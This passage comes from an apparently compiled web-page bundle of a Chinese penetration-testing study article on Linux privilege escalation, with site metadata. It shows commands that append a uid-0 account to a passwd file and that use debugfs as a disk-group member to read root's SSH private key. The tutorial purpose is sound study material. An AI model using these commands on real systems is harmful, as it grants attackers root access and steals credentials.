style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>echo &#39;name:saltpasswd:0:0::/root:/bin/bash&#39; &gt;&gt;passwd</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h5 id="disk提权" tabindex="-1"><a class="header-anchor" href="#disk提权"><span>Disk提权</span></a></h5><p>将测试用户添加到disk组中，diks组中的用户可以完全访问/dev/中包含的任何设备和文件，我们可以利用debugfs中的root权限进行提权</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>ls -la /dev/sda1</span></span>
<span class="line"><span>debugfs /dev/sda1</span></span>
<span class="line"><span>cd /root </span></span>
<span class="line"><span>cd .ssh</span></span>
<span class="line"><span>cat id_rsa</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>拿到root用户的密钥</p><figure><img src="`+k+'" alt="disk-key" tabindex="0" loading="lazy"><figcaption>disk-key</figcaption></figure><p>之后遍可使用ssh远程登录</p><h5 id="adm提权" tabindex="-1"><a class="header-anchor" href="#adm提权"><span>ADM提权</span></a></h5><p>ADM组中的用户有权限读取/var/log,用于收集存储在日志文件中的敏感信息和定时任务，枚举用户操作等</p>',262)]))}const A=i(u,[["render",g],["__file","系统提权.html.vue"]]),F=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%86%E6%9E%90/%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83.html","title":"系统提权","lang":"zh-CN","frontmatter":{"title":"系统提权","date":"2023-09-03T07:29:52.000Z","updated":"2023-08-06T16:43:24.000Z","categories":["渗透测试","技术原理与分析"],"description":"提权基础 权限提升在渗透测试中是必不可少的环节，为了得到更高的权限，攻击者可以利用各式各样的工具，漏洞来进行权限的提升 用户权限 在Linux中一个文件有3种权限。对文件而言用户有3种不同类型：文件所有者、群组用户、其他用户。例如：chmod 777中，三个数字7分别对应上面三种用户，权限值都为7。 文件权限： r 只读 w 只写 x 执行 高权限可进...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%86%E6%9E%90/%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"系统提权"}],["meta",{"property":"og:description","content":"提权基础 权限提升在渗透测试中是必不可少的环节，为了得到更高的权限，攻击者可以利用各式各样的工具，漏洞来进行权限的提升 用户权限 在Linux中一个文件有3种权限。对文件而言用户有3种不同类型：文件所有者、群组用户、其他用户。例如：chmod 777中，三个数字7分别对应上面三种用户，权限值都为7。 文件权限： r 只读 w 只写 x 执行 高权限可进..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:published_time","content":"2023-09-03T07:29:52.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"系统提权\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-09-03T07:29:52.000Z\\",\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"提权基础","slug":"提权基础","link":"#提权基础","children":[{"level":3,"title":"用户权限","slug":"用户权限","link":"#用户权限","children":[]}]},{"level":2,"title":"LINUX提权","slug":"linux提权","link":"#linux提权","children":[{"level":3,"title":"提权信息的收集","slug":"提权信息的收集","link":"#提权信息的收集","children":[]},{"level":3,"title":"提权方法","slug":"提权方法","link":"#提权方法","children":[]}]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":22.32,"words":6696},"filePathRelative":"渗透测试/技术原理与分析/系统提权.md","localizedDate":"2023年9月3日","excerpt":"<h2>提权基础</h2>\\n<p>权限提升在渗透测试中是必不可少的环节，为了得到更高的权限，攻击者可以利用各式各样的工具，漏洞来进行权限的提升</p>\\n<h3>用户权限</h3>\\n<p>在Linux中一个文件有3种权限。对文件而言用户有3种不同类型：文件所有者、群组用户、其他用户。例如：chmod 777中，三个数字7分别对应上面三种用户，权限值都为7。</p>\\n<ul>\\n<li>文件权限：\\n<ul>\\n<li>r 只读</li>\\n<li>w 只写</li>\\n<li>x 执行</li>\\n</ul>\\n</li>\\n</ul>\\n<p>高权限可进一步利用的方法：</p>\\n<ol>\\n<li>重置其他账户密码访问其他账户权限文件</li>\\n<li>绕过访问控制的权限操作数据内容</li>\\n<li>更改软件的配置</li>\\n<li>实现持久化</li>\\n<li>更改对应用户权限</li>\\n</ol>","autoDesc":true}');export{A as comp,F as data};
